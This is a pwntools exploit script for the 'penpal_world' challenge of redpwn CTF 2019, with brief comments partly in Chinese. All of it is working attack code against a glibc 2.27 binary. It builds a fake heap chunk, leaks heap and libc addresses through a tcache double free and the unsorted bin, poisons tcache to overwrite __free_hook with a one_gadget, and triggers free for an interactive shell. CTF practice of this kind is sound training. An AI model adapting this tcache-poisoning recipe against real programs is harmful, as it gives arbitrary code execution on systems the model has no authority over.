# libc 2.27  md5: 50390b2ae8aaa73c47745040f54e602f
# encoding: utf-8

from pwn import *

context.arch='amd64'

libc = ELF('./libc-2.27.so')

def create(idx):
	r.sendlineafter('card', '1')
	r.sendlineafter('?', str(idx))

def edit(idx, content):
	r.sendlineafter('card', '2')
	r.sendlineafter('?', str(idx))
	r.sendlineafter('.', content)

def discard(idx):
	r.sendlineafter('card', '3')
	r.sendlineafter('?', str(idx))

def show(idx):
	r.sendlineafter('card', '4')
	r.sendlineafter('?', str(idx))

def DEBUG():
	gdb.attach(r, '''
		''')

r = process('./penpal_world')
#r = remote('chall.2019.redpwn.net', 4010)
create(0) # chunk0
create(1) # chunk1

fake_heap = fit({0x0: flat(0, 0x91),
				 0x40: flat(0x90)
				}, filler='\x00')

edit(1, fake_heap)
create(1) # chunk2
discard(0) # tcache: 0
discard(1) # tcache: 2->0
show(1)

chunk0_addr = u64(r.recvn(8)[-7:-1]+'\x00'*2)
print "chunk0_addr @ ", hex(chunk0_addr)

heap_base = chunk0_addr-0x260
print "heap_base @ ", hex(heap_base)

edit(1, flat(chunk0_addr+0x60)) # tcache: 2->fake_chunk
create(0) # chunk2
create(0) # fake_chunk
create(1) # chunk3
for _ in range(8):
	discard(0) # tcache: fake->fake->... (塞滿 tcache) 最後一個會放到 unsorted bin
show(0)

libc_base = u64(r.recvn(8)[-7:-1]+'\x00'*2) - 0x60 - 0x3ebc40 

# 0x3ebc40 紀錄在 ida 的 malloc_trim() 內 , 為 main_arena 到 libc_base 的 offset
# 0x60 為 unsorted bin 到 main_arena 的位址

system_addr = libc_base + libc.symbols['system']

print "system_addr @ ", hex(system_addr)
free_hook_addr = libc_base + libc.symbols['__free_hook']

one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]
one_shot = libc_base + one_gadget[1]

discard(1) # tcache : 3
edit(1, flat(free_hook_addr)) # tcache : 3->free_hook
create(1) # chunk3
create(1) # free_hook
edit(1, flat(one_shot)) # 將 free_hook 改寫成 one gadget 
discard(1) # 觸發 free 

r.interactive()
